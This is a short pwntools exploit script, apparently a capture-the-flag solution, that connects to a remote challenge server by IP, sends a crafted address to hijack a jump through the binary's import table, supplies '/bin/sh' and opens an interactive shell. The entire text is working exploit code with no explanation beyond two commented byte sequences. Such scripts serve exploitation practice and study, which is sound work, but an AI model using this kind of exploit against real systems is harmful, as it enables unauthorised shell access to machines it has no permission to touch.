from pwn import *
context.log_level='debug'
context.terminal=['tmux','sp','-h']
# p = process("./pwn")
p = remote("118.190.62.234",12435)
elf = ELF("./pwn")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# gdb.attach(p,"b *0x0804875D")
# raw_input()
p.recvuntil("Try use a bullet to pwn this\n")
p.send(p32(0x80484d0+2)+'\x24')
'''
FF 25 20 A0 04 08
FF 25 24 A0 04 08
'''

p.recvuntil("name?\x00")
p.send("/bin/sh\x00")


p.interactive()